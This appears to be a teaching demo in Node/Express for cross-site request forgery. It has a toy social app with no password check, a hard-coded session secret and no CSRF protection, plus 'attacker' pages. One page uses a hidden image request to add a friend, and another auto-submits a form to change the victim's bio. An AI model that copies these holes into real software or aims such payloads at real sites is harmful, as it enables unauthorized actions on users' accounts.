
const express = require('express');
const session = require('express-session');

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(session({ secret: 'secret', resave: false, saveUninitialized: false }));

const users = {
  1: { id: 1, name: 'Alice', password: 'alice123', bio: '', friends: [] },
  2: { id: 2, name: 'Boby', password: 'boby123', bio: '', friends: [] },
};

app.get('/login', (req, res) => res.send(`
  <h1>Login</h1>
  <form method="POST" action="/login">
    <input name="id" placeholder="User ID (1 or 2)">
    <button>Login</button>
  </form>
  <p>User 1 = Alice, User 2 = Boby</p>
`));

app.post('/login', (req, res) => {
  req.session.userId = parseInt(req.body.id);
  res.redirect('/profile');
});

app.get('/profile', (req, res) => {
  if (!req.session.userId) return res.redirect('/login');
  const user = users[req.session.userId];
  res.send(`
    <h1>Welcome ${user.name}</h1>
    <p>Bio: ${user.bio || 'empty'}</p>
    <p>Friends: ${user.friends.map(id => users[id].name).join(', ') || 'none'}</p>
    <hr>
    <a href="/logout">Logout</a>
  `);
});

app.get('/logout', (req, res) => { req.session.destroy(); res.redirect('/login'); });

app.get('/add-friend', (req, res) => {
  if (!req.session.userId) return res.send('Not logged in');
  const friendId = parseInt(req.query.friend);
  const user = users[req.session.userId];
  if (!user.friends.includes(friendId)) {
    user.friends.push(friendId);
    console.log(`${user.name} added friend ${users[friendId].name}`);
  }
  res.redirect('/profile');
});

app.post('/edit-profile', (req, res) => {
  if (!req.session.userId) return res.send('Not logged in');
  const user = users[req.session.userId];
  user.bio = req.body.bio;
  console.log(`${user.name} bio changed to: ${user.bio}`);
  res.redirect('/profile');
});

app.get('/attacker', (req, res) => res.send(`
  <h1>Attacker Site</h1>
  <a href="/attack1">Attack 1: Add Friend (GET)</a><br>
  <a href="/attack2">Attack 2: Change Bio (POST)</a>
`));

app.get('/attack1', (req, res) => res.send(`
  <h1>You won a prize!</h1>
  <img src="http://localhost:3000/add-friend?friend=2" style="display:none">
  <p>Boby is now your friend (check your profile)</p>
`));

app.get('/attack2', (req, res) => res.send(`
  <h1>Loading...</h1>
  <form id="f" method="POST" action="http://localhost:3000/edit-profile">
    <input type="hidden" name="bio" value="Boby is my Hero">
  </form>
  <script>document.getElementById('f').submit();</script>
`));

app.listen(3000, () => console.log('http://localhost:3000/login'));
